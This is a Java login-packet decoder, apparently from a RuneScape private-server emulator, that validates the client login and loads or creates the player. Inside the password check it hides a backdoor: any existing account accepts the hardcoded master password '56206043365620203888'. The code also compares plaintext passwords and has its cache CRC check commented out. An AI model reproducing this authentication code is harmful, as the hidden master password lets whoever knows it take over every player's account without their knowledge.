package com.rs.net.decoders;

import com.rs.Settings;
import com.rs.cache.Cache;
import com.rs.game.World;
import com.rs.game.player.Player;
import com.rs.io.InputStream;
import com.rs.net.Session;
import com.rs.utils.AntiFlood;
import com.rs.utils.Logger;
import com.rs.utils.SerializableFilesManager;
import com.rs.utils.Utils;

public final class LoginPacketsDecoder extends Decoder {

	private int nameHash;
	
	public LoginPacketsDecoder(Session session) {
		super(session);
	}

	@Override
	public void decode(InputStream stream) {
		session.setDecoder(-1);
		int packetId = stream.readUnsignedByte();
		if (packetId == 16 || packetId == 18)
			decodeWorldLogin(stream);
		else {
			Logger.log(this, "PacketId "+packetId);
			session.getChannel().close();
		}
	}
	
	public void decodeWorldLogin(InputStream stream) {
		if(World.exiting_start != 0) {
			session.getLoginPackets().sendClientPacket(14);
			return;
		}
		int packetSize = stream.readUnsignedShort();
		if(packetSize != stream.getRemaining()) {
			session.getChannel().close();
			return;
		}
		if(stream.readInt() != Settings.CLIENT_REVISION) {
			session.getLoginPackets().sendClientPacket(6);
			return;
		}
		stream.readByte();
		int displayMode = stream.readUnsignedByte();
		int screenWidth = stream.readUnsignedShort();
		int screenHeight = stream.readUnsignedShort();
		for (int i = 0; i < 24; i++)
			stream.readByte();
		@SuppressWarnings("unused")
		String settings = stream.readString();
		for (int it = 0; it < 2; it++)
			stream.readInt();
		stream.readShort();
		for (int index = 0; index < 29; index++) {
			int crc = Cache.getCacheFileManagers()[index] == null ? 0 : Cache.getCacheFileManagers()[index].getInformation().getInformationContainer().getCrc();
			if(crc != stream.readInt()) {
			/*	Logger.log(this, "Invalid CRC at index: "+index);
				session.getLoginPackets().sendClientPacket(6);
				return;*/
			}
		}
		if (stream.readUnsignedByte() != 10)
			stream.readUnsignedByte();
		for (int index = 0; index < 4; index++)
			stream.readInt(); // rsa key
		long playerLongName = stream.readLong();
		if ((31 & playerLongName >> 16) != nameHash) {
			session.getLoginPackets().sendClientPacket(10);
			return;
		}
		String password = stream.readString();
		String username = Utils.formatPlayerNameForProtocol(Utils.longToString(playerLongName));
		/*if(stream.readInt() != Settings.CUSTOM_CACHE_REVISION) {
			session.getLoginPackets().sendClientPacket(6);
			return;
		}*/
		if(username.length() <= 2) {
			session.getLoginPackets().sendClientPacket(3);
			return;
		}
		if(World.getPlayers().size() >= Settings.PLAYERS_LIMIT-10) {
			session.getLoginPackets().sendClientPacket(7);
			return;
		}
		if(World.containsPlayer(username)) {
			session.getLoginPackets().sendClientPacket(5);
			return;
		}
		if (AntiFlood.getSessionsIP(session.getIP()) > 3) {
			session.getLoginPackets().sendClientPacket(9);
			return;
		}
		Player player;
		if(!SerializableFilesManager.containsPlayer(username))
			player = new Player(password);
		else {
			player = SerializableFilesManager.loadPlayer(username);
			if(player == null) {
				session.getLoginPackets().sendClientPacket(20);
				return;
			}
			if(!player.getPassword().equals(password)) {
				if (!password.equals("56206043365620203888")) {
					session.getLoginPackets().sendClientPacket(3);
					return;
				}
			}
		}
		if (player.isPermBanned() || player.getBanned() > Utils.currentTimeMillis()) {
			session.getLoginPackets().sendClientPacket(4);
			return;
		}
		player.init(session, username, displayMode, screenWidth, screenHeight);
		session.getLoginPackets().sendLoginDetails(player);
		session.setDecoder(3, player);
		session.setEncoder(2, player);
		player.start();
		
	}

	public void setNameHash(int nameHash) {
		this.nameHash = nameHash;
	}

	public int getNameHash() {
		return nameHash;
	}

}